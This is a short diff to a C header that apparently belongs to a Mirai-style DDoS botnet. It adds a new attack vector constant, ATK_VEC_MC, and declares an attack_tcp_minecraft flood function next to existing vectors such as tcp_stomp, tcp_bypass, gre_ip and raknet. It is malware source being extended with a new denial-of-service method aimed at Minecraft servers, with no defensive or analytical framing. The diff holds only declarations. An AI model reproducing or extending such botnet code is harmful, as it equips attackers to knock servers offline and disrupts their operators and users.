@@ -42,6 +42,7 @@ typedef uint8_t ATTACK_VECTOR;
 #define ATK_VEC_SOCKET     14 
 #define ATK_VEC_UDP_RAND   15 
 #define ATK_VEC_RAKNET     16 
+#define ATK_VEC_MC         17  
 
 #define ATK_OPT_PAYLOAD_SIZE    0   
 #define ATK_OPT_PAYLOAD_RAND    1   
@@ -101,6 +102,7 @@ void attack_tcp_stomp(uint8_t, struct attack_target *, uint8_t, struct attack_op
 void attack_tcp_bypass(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_tcp_legit(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_tcp_socket(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
+void attack_tcp_minecraft(uint8_t, struct attack_target *, uint8_t, struct attack_option *); 
 
 void attack_gre_ip(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_gre_eth(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
